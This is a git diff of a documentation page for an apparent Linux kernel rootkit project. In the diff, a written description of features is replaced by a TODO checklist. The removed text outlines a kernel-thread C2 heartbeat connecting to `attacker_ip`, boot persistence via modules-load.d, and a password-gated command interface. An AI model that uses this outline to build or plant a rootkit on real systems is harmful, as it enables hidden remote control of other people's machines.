@@ -9,46 +9,13 @@ toc: true
 weight: 58
 ---
 
-# 1. Encrypted C2 Heartbeat
+## TODO: Implement Persistence & Auth Features
 
-**What we did**  
-Spawn a kernel thread to poll our C2 server.
+- [ ] Implement encrypted C2 heartbeat and reconnection logic
+- [ ] Add autoload on boot (persistence) via module config
+- [ ] Implement password protection for sensitive commands
+- [ ] Store and verify password hashes securely
+- [ ] Test persistence and authentication on supported systems
 
-**How it works**  
-1. `kthread_run(c2_thread_fn, &cfg, "epic2")`.
-2. Loop:
-   - `msleep(ping_interval_ms)`.
-   - `kernel_socket()`, `kernel_connect(attacker_ip, port)`.
-   - Exchange AES-128-CBC packets using keys from `.epirootkit-config`.
+_This section will be updated with documentation once features are implemented and tested._
 
----
-
-# 2. Persistence & Autoload
-
-**What we did**  
-Automatically load on reboot.
-
-**How it works**  
-Our `installer.sh`:
-1. Copies `epirootkit.ko` to `/lib/modules/$(uname -r)/extra/`.
-2. Runs `depmod -a`.
-3. Writes `/etc/modules-load.d/epirootkit.conf` with:
-   ```
-   epirootkit
-   ```
-    
----
-
-# 3. Password Protection
-
-**What we did**  
-Protect `daniel.*` commands with a salted hash.
-
-**How it works**  
-1. Store `SHA256(salt‖password)` in `/etc/epirootkit/passwd`.
-2. First command must be  
-   ```
-   daniel.p.<hex-salted-hash>
-   ```
-3. We compare hashes; only then unlock the command interface.
-```
